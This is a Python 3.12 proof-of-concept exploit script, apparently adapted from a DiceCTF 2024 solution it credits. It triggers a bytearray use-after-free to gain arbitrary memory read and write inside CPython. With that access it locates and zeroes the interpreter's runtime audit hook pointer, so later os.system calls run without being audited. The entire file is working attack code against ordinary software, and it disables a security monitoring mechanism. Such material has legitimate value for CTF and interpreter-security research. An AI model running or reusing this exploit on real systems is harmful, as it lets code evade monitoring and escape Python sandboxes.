#!audit_hook_head_finder

# sys only for version check
import os, sys
from audit_hook_head_finder import add_audit
assert sys.version_info[:2] == (3, 12), "This POC is for Python 3.12 only"

add_audit()

os.system("echo 'test audit hook -- this will trigger hook'")

getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)

# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# improved by Maple Bacon
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

# any function works here theoretically
ptr = getptr(os.system.__init__) + 24
ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') + 48

# by
# from audit_hook_head_finder import get_runtime_audit_hook_ptr_addr
# # should be offset= - 0xc948
# print("offset=", hex(get_runtime_audit_hook_ptr_addr() - ptr))

ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') - 0xc948

memory[ptr:ptr + 8] = [0] * 8

os.system("echo 'test audit hook -- this will not'")